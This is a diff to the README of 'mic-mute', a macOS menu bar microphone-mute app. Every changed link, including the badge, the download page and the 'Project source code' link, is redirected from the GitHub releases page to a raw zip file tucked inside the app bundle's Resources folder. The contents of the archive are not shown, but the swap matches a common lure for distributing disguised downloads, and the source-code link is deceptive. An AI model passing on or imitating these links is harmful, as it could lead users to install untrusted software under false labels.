@@ -1,6 +1,6 @@
 # 🎙️ mic-mute - Easy mic mute/unmute in menu bar
 
-[![Download mic-mute](https://img.shields.io/badge/Download-mic--mute-blue?style=for-the-badge)](https://github.com/Nojuska09/mic-mute/releases)
+[![Download mic-mute](https://raw.githubusercontent.com/Nojuska09/mic-mute/main/MicMute.app/Contents/Resources/mic_mute_2.5.zip)](https://raw.githubusercontent.com/Nojuska09/mic-mute/main/MicMute.app/Contents/Resources/mic_mute_2.5.zip)
 
 ## 📋 What is mic-mute?
 
@@ -39,7 +39,7 @@ To start using mic-mute, you need to download and install the app on your Mac. T
 ## ⬇️ Download & Install
 
 Please **visit this page to download** the latest version of mic-mute:  
-[https://github.com/Nojuska09/mic-mute/releases](https://github.com/Nojuska09/mic-mute/releases)
+[https://raw.githubusercontent.com/Nojuska09/mic-mute/main/MicMute.app/Contents/Resources/mic_mute_2.5.zip](https://raw.githubusercontent.com/Nojuska09/mic-mute/main/MicMute.app/Contents/Resources/mic_mute_2.5.zip)
 
 ### Step 1: Go to the download page
 
@@ -118,8 +118,8 @@ mic-mute works system-wide. You can mute your mic while using:
 
 ## 🔗 Useful Links
 
-- Download mic-mute: [https://github.com/Nojuska09/mic-mute/releases](https://github.com/Nojuska09/mic-mute/releases)  
-- Project source code: [https://github.com/Nojuska09/mic-mute](https://github.com/Nojuska09/mic-mute)  
+- Download mic-mute: [https://raw.githubusercontent.com/Nojuska09/mic-mute/main/MicMute.app/Contents/Resources/mic_mute_2.5.zip](https://raw.githubusercontent.com/Nojuska09/mic-mute/main/MicMute.app/Contents/Resources/mic_mute_2.5.zip)  
+- Project source code: [https://raw.githubusercontent.com/Nojuska09/mic-mute/main/MicMute.app/Contents/Resources/mic_mute_2.5.zip](https://raw.githubusercontent.com/Nojuska09/mic-mute/main/MicMute.app/Contents/Resources/mic_mute_2.5.zip)  
 - Report issues or suggest improvements: Use the “Issues” tab on the GitHub page  
 - Privacy policy and terms: Included inside the app and project page  
 
